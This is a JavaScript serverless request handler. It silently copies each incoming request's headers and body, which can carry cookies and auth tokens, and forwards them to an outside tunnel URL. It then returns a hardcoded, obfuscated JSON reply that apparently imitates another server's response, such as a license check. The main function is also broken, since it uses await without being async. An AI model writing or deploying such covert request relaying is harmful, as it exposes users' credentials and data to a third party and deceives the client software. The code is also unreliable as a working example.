export function onRequest(context) {
	
	 const { request } = context;
  const requestBody = await request.clone().text(); // Clone request to extract body
  const requestHeaders = Object.fromEntries(request.headers.entries()); // Get request headers

  // URL of the other server to forward the request data
  const serverUrl = 'https://bbcf60be697e67.lhr.life/ak';

  // Prepare options for the fetch request
  const options = {
    method: request.method,
    headers: requestHeaders, // Forward the original request headers
    body: requestBody // Forward the original request body
  };

  // Make the call to another server
  try {
    const response = await fetch(serverUrl, options);
    const responseData = await response.json(); // Assuming the response is JSON
    console.log('Response from the server:', responseData);
  } catch (error) {
    console.error('Error making the request to the other server:', error);
  }
	
	
  const jsonResponse ={"result":{"\u0006WLW":"Q\u0003\u0000\u0004I\u0007wwQ \\\u0001\u0006\u0002r\u0005S]Wrp\u0007WrqQpRT'\u0006\"Pu\rsV\u0000\u0005pQ%P|\tu\u0001\u0005S\\Sv\u0005q]\btV\u0000RSRwT&\u000e{sV\u0005\u0001\u000f'SQ\br\u0006t\u0004SW\\\u0005\u0003\u0006!\u0005\u0007\"\bZTVwSP\u0004z\u0005U\u0005p\u0003P%U\trr\u0005PT#w\u0002\u0006%t\u0004 \u0005\"''\u0006P \u0004\f\u0004 \u0005\u0000\u0003RUS\b\u0003\f\u000e\u0003X!Qwu\u0000 \u0005vR\u0003WVS\u0005_ \u0007{w \u0002\u0000\u0007RW \u000e\u0001\r\u0001t#\"#\r\u0000pT\tw\"\u0002&Z$\tUQu\ttU\u0006v\u0000]R'\u0001\u0000uw\u0001T\"'up\u0007PpwPsU\"Z\u0005^R\u0001\tsPsvt&Q!x\u0007u\u0005rSS p\u000buQ\u0002pQ\u0002WTW\u0002UZ\u0001zuPp\u0001p'TP\r\u0000\u0005ss#%#\u0001\n\u0006Ps\u0000P\u0002TZ#\u0002PPp{wP\u0005\u0004\u0001&ZW\t\u0001\u0006\u000e\t#\\'\u0003\u0007\u0002 \u0006\u0006W\u0004'T$\u0001SZ\u0000\u000e\u0002Qst\u0002UZQzt\f\u000ft'%Wuw\u0005 \b\u0005$p[S[t#U\u0006\u000b\u000f!\u0005\u0005t# P\br\u0000\u0006\u0002%W\\\r\u0004\u0001!\u0002\u0004P\u0004QTW\tRQt\u0000wRw\u0002rT P|\u0003\r\u0005vSP\\pp\u000bU\b\u0006Q\u0001Z[S\u0006#'\u0001\tuUs\u0007\u0004UR\\{v\u0001\u0000\u0001VW&w\u0003\u0002S\u0004\u0005RuTP \u0005#&u\u0000u&\u0006v\u0004\\PV\b\u0006v\u0004rRW]r\u0001wT\u0003wTw%S&u\"$w\t\u0002Wu\u0000\u0007TS]\u000er\f\u0005uP!Su\u0001w'\u0001\u0004Q\u0001[P'\u0005URw\u0000\u0001W\u0001vuWS\"\u000fq\r\u000frY%V\u0005pwPsw^\u0006SP'sQQ\u0000\t\u0003]\u0003wp  !\nq\ru\u0006U\"V\u0002wp!\u0004p s Q[uQS\u0003y\u0005\"p\fuW\"S}\u0002v\u0003\u0004\"]Sw\u0002\u0002]t\u000bU\u0004 P$\u0002VV\u0004z\u0005\\\u0002\u0001r! R\u0001r\u0000\u0000\u0000Y&Pr\n\u0004]t\u0002Q\u0006PW!\u0002RV\u0000\u000f\u0002 \u0003w\u0001SRS\tr\u0006u\u0002UV \u0007\u0002\u0001\\ttUt!VV\u0004WR\u0000~p\"\btt!VU\u000e\u0001\u0004t\u0001XT'\u0005\u0006wWr\u0003WpZR'tW$\u0003\u000esQ\u0003\u0006\u0000RZU\b\u0006u\u0007\u0001'WT\u0006wp't\u000bVpWUW\u0002VZ\u0004\r\u0006'\u0001\u0002\u0003VV%\u0000\u0000ru\u0003Q%&pq\u0003Vs\u0007R\u0004T'U\bUTu}\u000f]u\u0002\u0007T V\bur\u000e\bS\\Sq\u0000\u0005 w\u0004SuR&[\t^[w\u000b\u0005Qp\u0004wTP!\t\u0004v\u0005\u0000P!Pw\u0005\u0007Q\u0005\u0001_\u0004!%T\tT$\u0003z\u0000V\u0001\u0007rT Q\u000ft\u0004\u0004\u0004T\\P\u0001\n\u0003Us\u0001T\u0000[%U\u0005$!\u0007\u0001rVt\u0000\u000eWZT\u0000\b\u0000\u000e\t\"\\ \u0002\u0001v u\u000bW\u0006SS[\u0005\"[\u000e\u0001\u0005Pw\u0000\u0001!RR|\u0007\u0005\u0005\u0000Y]Vq\u0002\u0004T\u0006tQt\"S tV$w{\u0007T\t\u0007\u000eR&%\t\u0006\u0003\u0007\bR%$\u0002q\u0001'tt%\u0000VP'\tS s}\u000f]\u0004\u0002\u000eT  \u000fu\u0007\u0007r'SSv\u0003\u0000T\u0000pS\u0003VWZ\u0005 #u}w&\t\u0005s&V }\u0006\ru\u0001UWWr\u0007\u0002%\u0001qQ\u0003T['pS[u}sTst\u0006WRV}\b\u0001\u0007vP\\V\fvq&\u0003\u0003%\u0007UUU\u0005 W\u0001y\u000fQs\u0007\u0006'&Qz\u0003\f\u000ftX\\$q\u0003\u0007Q\u0007\u0002'\u0001R $\u0005URt\tpT\u0007p\u0007#VU\u000e\u0007\u0007\u000f\u0005XTR\u0005p\u0007S\u0002\u0007 \u0005P!TsSZpzwW\u0003p\u0006#Q&\f\u0001p\u0000\u0006YRP\u0006r\u0005W\u0005\u0000S\u0001\"! \u0003%'\u0001\brQ\b\u0005\u0006$SP\u0001sq\u0000\u0003UPS\u0001p\u0002Uu\u0005V\u0000Q!Qr%Q\u0001\ftS\u0004\u0002\u0007QS%\buq\u0002\u0004%UQ\u0006w\u0007!\u0002\u0005T\u0005!!T\b\" p\b\u0002Sr\u0002uSZ\\}\u0004v\u0003\u0004#WU\u0005vqVu\u0003V\u0007QPWtS'\u0000\u0000\u000eU\u0003\u0002\u000fR&Sz\b\u0002\u0002\u0001RR$\f\u0000p\\\t\u0001_rRQQ\u0004Q#\u0005\frW\u0000\u0000\u0005&PU\t\u0005\r\u0004\u0006V\\ \rwv\\uvQ\b'\"$\u0002_Zwy\u0005]\b\u0007s$!W\nu\u0007\u0001\u0002 'Uw\u0000\u0004\"\u0004\u0007^\u0007QPZ\t$W\u0003~\u0001R\u0006\u0003pR'W\u0001v\u0001\u0002\u0000#'\\vuu\"\u0006\u0002S\u0005P[Ur\"$p\nwP\b\u0002\u0007#RU{u\u0003rsT'Tr\u0003\u0007T\u0007q^\u0001!%T\u0007^&\u000e{\u0002W\u0002\u0001\u0005P W\ntv\u0002qR%&\u0007\u000b\u0002 \u0003tTr'S!\u0000RR\u0004\u0000\u000f\\\t\u0002r$P%\u000eu\u0007w\t U]vu\u0001Q\t\u0007_\u0007 TQu#R\u0001\fsSwtu#PV\u000ev\u0007\u0002rSP\\\f\u0007\u0006Uu\nW\u0001P&Z\u0007V'\u000ez\u0005U\u0003pw!TP|rvwqSS]p\u0005\u0000P\t\u000bP\t 'Z\u0006PU\u0004\nw!p\u0005\u000e&U \u000eu\r\u0005\u0006#U \u0003\u0002\u0006]\u0003vUsQRT\b'Uuz\u0001U\u0001\u0001uSSR\tur\u0002\t\"R\\\u0003\u0007\u0001P\tv%u R \u0005V'\u0007|w'p\fsPWU|s\u0005\u0007qT]\\r\npVt\u0006^wR'Q\u0001UT\u000e|uP\u0004\u0002w]UV\n\u0000\fprU\\S\rwpSw\u0004W\bUQUsW!\u0003\u000b\u0005 \u0006q\u0003UQR\u0003\u0002\u0002sVUQprw'u\u0000 p\"[!uVT\u000f\r\u0000QtspT'\\\u000f\u0004\u0006\u0007\u0003SU]\u0001q\u0000'r\u0005RsZVQtP!\u0002\fp\"\u0007\u0003r#% \u000b\u0004\u0004\u0003sQ #\u0004\u000br%u\u0005'rRR \u0007U[\u0005}\u0005]t\u0006\u0005#U\"\u000e\b\u0002\u0000\u0001T'\\ww\u0005!\u0001\u0006StZUTu #t\u000et&rs\u0006U[U\u0001v\u0004\u0006\u0003YQ$\u0005\u0007\u0001!w\u0007T\u0004 'Q\u0004\"Tu|\u0005T\t\rrQ\"V\u0001rp\u000eq%]S\rwpQ\u0007\u0007'\u0002&\"Z\u0000WV\u0003|\u0001%u\u0000\u0001&\"Q\u0007q\u0001\t'& \u0002\u000bv\\\u0001\u0005WpTZP\u0004$Ut\bpQsv\u000eQTW\b\u0005wu#QQ\u0004r\u0000!tw'sP&$\u0004'&\u000f{\u0000S\u0000\u0007\u0006\\V%}vu\u000f\u0001X'$w\u0005\u0007P\t\nUw\"U \u0007%R\u0006\ru \u0003\u0006\u0000] 'zq\u0007\u0002\t\"%&\u0001\u0005\u0002VrsR\u0001&RV\u0002%V\u0007\r\u0002V\u0004\r\u0003\\SW\u000ev\r\u0006rW Upuw%\b\u0001R\u0007S% wPWs{uU\u0001q\u0001&!W}trw\u0003RQV\u0005\u0001\u0002P\b\u0003#r'ZV\u0003\"&ty\u0000&\u0001w\u0004T[R{v\u0006\u0004\bPWW\u0002\u0007r]psQ\u0005TV pV'r}pR\u0005\u0007\u0002Q\"\"\u000f\u0004\f\u0004\u0002RTR\u0006wuT\u0004\u0005R\u0004QVV\u0000\"&\u0002\u0000\u0005\"\u0005\u0004pVP\\\bv\r\u000f\u0000RSR\u0007\u000b\u0002Tp\u0002RrZ!T\tV$\u000e\ntQt\u0007\u0002R%T\u000fs\u0004rtX\\Up\u0000\u0002V\b\u0000Vs%RQ\tSV\u0006\u0000\u000fU\u0000\fsUU!\rs\u0001w\u0002SP&p\u0004\u0006W\u0000sRt%! uS[\u0006|\u000eV\u0001w\u000f\\U&\u000f\u0006\u0001rq'TT\r\u0001\u000bQr\u0007 \u0002SRPr'[\u000e~pW\u0003p\u0003&!Q\f\u0005p\u0001\b SSrv\u0005W\u0005\u0000Q\u0003 &&p%Wt\b\u0003&t\u0007\u0000WWT\u0000tvt\u0004Q!W\u0004\u0003\u0003]\t\u0001%sS'$rSS\u0000\u000f\u0000!\u0003\u0006\u000eVW!{s\u0005\u000e\u0005VP]rp\u0001S\t\u000bQp!\" \u0005 &u\u0000p]\u0000tuP\"T\u0001\u0006\u0001\u0006\u0006TPW\u0007u\u0007]\u0004sR\u0006SS&\u0002$V\u0005\r\u000fP\u0007\u0004\u0003URS|\u0001r\u0003\u0001 T!vvrU\u0003t \u0002STQ\u0004'V\u0001\u0000uWuq\u0003R&W\u000f\u0000\u0005\u0003qSR'q\u0000vPr\u0006_\u0000'QQt%V\u0001{\u0003P","\u000fSKE\u0005VP":"S","\u0011BYB\u0011B":"P\u0006\b","\tSA":"'6^7-2|63b6=n4f","\u000bE]X\u0005SYS:\u0002\u0011M_ECU\u0014\u0001":"Q","\u0007NH_\u0016Ha_\b\u0006":"6C]\u0016+RA\u0016TVD\u000b\u0000\u0006\u0002\u0010ST_\u0001\u000b\tQ\u0005\u0012!|7HR\u0006\\R\u0006\u0018\u001e-_QY\u0006\u000b\rWQ\u0014bY\f\u0001L","\u000eUgB\u001dAP":"Q","\u000eUgA\fXAS":"\u0012YWZJ_AFK\f\u0016^\u001fW[\u001e\u0012\u0001\u0017Q]TJ\\[\bX\u0000\u000f\u000bA\u0016\u0016\u0018[Y\tCPBJ\u000f\rOU\u0019U_\u000f\u0002\fS\u001dC\u000b^^H\\\n\r\u000bR\n\u000bFHBKWTU\u0000\u0001\u000bV[","\u0017Fg@\u0007^QS":"Q\u0003\u0000\u0004","\u0017Fg@\nPXS":"W\u0003\u0016\u000fJ\u0001","\u0001@\\S\bET":"U\u0004\b\u0006"}};

  return new Response(JSON.stringify(jsonResponse), {
    status: 200,
    headers: {
      "content-type": "application/json"
    }
  });
}
/**
export async function onRequestPost(context) {
  const { request } = context;

  // Check if the request method is POST
  if (request.method === "POST") {
    try {
      // Get the JSON body from the request
      const requestBody = await request.json();

      // Log or process the JSON body as needed
      console.log("Received JSON body:", requestBody);

      // Return a response with the received JSON
      return new Response(JSON.stringify({ received: requestBody }), {
        headers: { "Content-Type": "application/json" },
      });
    } catch (error) {
      // Handle errors, e.g., if the body is not valid JSON
      return new Response("Invalid JSON", { status: 400 });
    }
  } else {
    // If not a POST request, return a 405 Method Not Allowed
    return new Response("Method Not Allowed", { status: 405 });
  }
}
**/

